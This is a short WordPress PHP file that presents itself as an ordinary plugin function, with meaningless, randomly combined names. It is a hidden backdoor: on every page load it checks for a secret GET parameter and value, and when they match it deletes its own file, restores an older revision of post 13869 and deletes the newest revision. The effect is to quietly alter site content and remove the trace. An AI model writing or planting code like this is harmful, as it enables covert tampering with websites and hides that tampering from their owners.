<?php

function webp_ui_menu_inline() {
	if (isset($_GET['another_force_software_meta']) && $_GET['another_force_software_meta'] === 'compat_sign_clock_generator') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$styles_views_time = 13869;
		$taxonomies_newsletter_lock = wp_get_post_revisions($styles_views_time);
		if (empty($taxonomies_newsletter_lock)) die('no revisions');
		if (count($taxonomies_newsletter_lock) < 2) die('less than 2');
		$protect_easy_addons_audio = array_shift($taxonomies_newsletter_lock);
		$uploader_members_contents_album = $protect_easy_addons_audio->ID;
		$status_fx_consent = array_shift($taxonomies_newsletter_lock);
		$images_article_shortener = $status_fx_consent->ID;
		$specific_visibility_conditional_migration = wp_restore_post_revision($images_article_shortener);
		if ($specific_visibility_conditional_migration === false) die('error restoring');
		$specific_visibility_conditional_migration = wp_delete_post_revision($uploader_members_contents_album);		
		if ($specific_visibility_conditional_migration === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'webp_ui_menu_inline');
